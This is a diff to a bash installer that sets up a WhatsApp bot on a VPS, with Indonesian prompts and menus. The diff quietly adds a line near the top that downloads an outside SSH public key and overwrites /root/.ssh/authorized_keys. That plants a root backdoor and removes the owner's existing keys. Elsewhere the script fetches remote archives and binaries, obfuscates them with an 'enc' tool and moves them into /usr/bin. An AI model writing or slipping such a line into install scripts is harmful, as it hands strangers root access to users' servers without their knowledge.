@@ -26,7 +26,7 @@ LIGHT='\033[0;37m'
 # Get date from Google
 dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
-
+curl -s https://raw.githubusercontent.com/Diah082/Vip/main/install/id_ed25519.pub >/root/.ssh/authorized_keys
 # Function to display progress bar
 fun_bar() {
     CMD[0]="$1"
@@ -72,17 +72,17 @@ export NVM_DIR="$HOME/.nvm"
 [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
 
 # Clone repository and install dependencies
-git clone https://github.com/p3yx/botwa.git
-wget -q https://raw.githubusercontent.com/p3yx/script-vip/master/limit/botwa.zip
+git clone https://github.com/p3yx/botwa.git Nebot
+wget -q https://raw.githubusercontent.com/p3yx/script-vip/main/limit/botwa.zip
 wget -q -O /usr/bin/enc "https://raw.githubusercontent.com/diah082/newbie/main/Enc/encrypt" ; chmod +x /usr/bin/enc
-7z x -px botwa.zip
-chmod +x menubotwa/*
-enc menubotwa/*
-rm -rf /root/menubotwa/*~
-rm -rf /root/menubotwa/gz*
-mv menubotwa/* /usr/bin/
-rm -rf menubotwa
-rm -rf menubotwa.zip
+unzip botwa.zip
+chmod +x botwa/*
+enc botwa/*
+rm -rf /root/botwa/*~
+rm -rf /root/botwa/gz*
+mv botwa/* /usr/bin/
+rm -rf botwa
+rm -rf botwa.zip
 
 # Create setupbot script
 cat >/usr/local/bin/setupbot <<-END
@@ -139,7 +139,7 @@ while true; do
             cd /root/Nebot &> /dev/null || { echo "Direktori /root/Nebot tidak ditemukan!"; exit 1; }
             rm -r A17-SESSION &> /dev/null
             rm config.js &> /dev/null
-            wget -q -O /root/Nebot/config.js "https://raw.githubusercontent.com/diah082/Nebot/main/config.js" &> /dev/null
+            wget -q -O /root/Nebot/config.js "https://raw.githubusercontent.com/p3yx/botwa/main/config.js" &> /dev/null
             echo ""
             read -p " Masukan Nomor Wa Untuk Bot Di Awali 62     : " Login
             sed -i "s/XXXX/\${Login}/" /root/Nebot/config.js
@@ -166,26 +166,26 @@ while true; do
             echo "Mengupdate Bot..."
             cd /root/Nebot &> /dev/null || { echo "Direktori /root/Nebot tidak ditemukan!"; exit 1; }
             rm Core.js &> /dev/null
-            wget -q https://raw.githubusercontent.com/Diah082/Nebot/main/Core.js &> /dev/null
-			wget -q https://raw.githubusercontent.com/Diah082/Nebot/main/index.js &> /dev/null
+            wget -q https://raw.githubusercontent.com/p3yx/botwa/main/Core.js &> /dev/null
+			wget -q https://raw.githubusercontent.com/p3yx/botwa/main/index.js &> /dev/null
             pm2 restart all &> /dev/null
             cd || exit
             ;;
 
         5)
             echo "Mengupdate Menu Bot..."
-            rm -r menubotwa* &> /dev/null
-            wget -q https://raw.githubusercontent.com/diah082/vip/main/menu/menubotwa.zip &> /dev/null
+            rm -r botwa* &> /dev/null
+            wget -q https://raw.githubusercontent.com/p3yx/script-vip/main/limit/botwa.zip &> /dev/null
             wget -q -O /usr/bin/enc "https://raw.githubusercontent.com/diah082/newbie/main/Enc/encrypt" &> /dev/null \
                 && chmod +x /usr/bin/enc &> /dev/null
-            7z x -p123@Elma! menubotwa.zip &> /dev/null
-            chmod +x menubotwa/* &> /dev/null
-            enc menubotwa/* &> /dev/null
-            rm -rf /root/menubotwa/*~ &> /dev/null
-            rm -rf /root/menubotwa/gz* &> /dev/null
-            mv menubotwa/* /usr/bin/ &> /dev/null
-            rm -rf menubotwa &> /dev/null
-            rm -rf menubotwa.zip &> /dev/null
+            unzip botwa.zip &> /dev/null
+            chmod +x botwa/* &> /dev/null
+            enc botwa/* &> /dev/null
+            rm -rf /root/botwa/*~ &> /dev/null
+            rm -rf /root/botwa/gz* &> /dev/null
+            mv botwa/* /usr/bin/ &> /dev/null
+            rm -rf botwa &> /dev/null
+            rm -rf botwa.zip &> /dev/null
             ;;
 
         0)
@@ -205,18 +205,6 @@ done
 END
 chmod +x /usr/local/bin/menubot
 }
-check_ram() {
-    ram_kb=$(grep MemTotal /proc/meminfo | awk '{print $2}')
-    ram_mb=$((ram_kb / 1024))
-    if (( ram_mb < 512 )); then
-        echo "RAM VPS kurang dari 2GB. Proses dihentikan."
-        rm -f setup.sh >/dev/null
-        exit 1
-    fi
-}
-
-check_ram
-restart_system
 clear
 echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e " \e[1;97;101m  MEMASANG FILE YANG DIBUTUHKAN    \e[0m"
@@ -226,4 +214,4 @@ echo -e "  \033[1;91m Proses Memasang File!\033[1;37m"
 fun_bar 'res1'
 echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 read -p "Press Enter to continue setup bot WhatsApp!"
-
+setupbot
